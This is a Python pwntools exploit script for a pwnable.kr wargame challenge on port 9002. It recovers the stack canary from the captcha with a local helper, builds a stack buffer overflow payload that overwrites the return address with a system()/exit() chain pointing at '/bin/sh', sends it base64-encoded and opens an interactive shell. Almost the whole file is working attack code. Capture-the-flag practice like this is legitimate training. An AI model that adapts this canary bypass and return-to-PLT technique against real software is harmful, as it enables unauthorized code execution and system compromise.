#! /usr/bin/python

from pwn import *
import ctypes

HOST = "pwnable.kr"
PORT = 9002

sock = remote(HOST, PORT)

# plt addresses
system_addr = 0x08048880
exit_addr = 0x08048a00
print_addr = 0x08048940
g_buf = 0x0804b0e0

sock.recvuntil("captcha : ")
captcha = sock.recvuntil("\n")
sock.send(captcha)
sock.recvuntil("paste me!\n")

rand_calc = subprocess.check_output('./rand_calc').strip()
# We need ctypes uint so that the potential -negative canary value
canary = ctypes.c_uint(int(captcha) - int(rand_calc)).value

payload = ''
payload += 'A'*512 # Fills buffer
payload += p32(canary) # Computed canary
payload += 'B'*12 # canary is pushed to stack at esp-16, so 12 bytes of filler plus 4 byte eip
payload += p32(system_addr) # System addr
payload += p32(exit_addr) # exit addr
payload += p32(g_buf+len(b64e(payload))+4) # Pointer to /bin/sh that's stored in g_buf unencoded
					   # Compute size of b64 payload plus 4 for g_buf pointer
sock.sendline(b64e(payload)+'/bin/sh\0')
try:
    sock.interactive()
    sock.close()
except EOFError:
   None
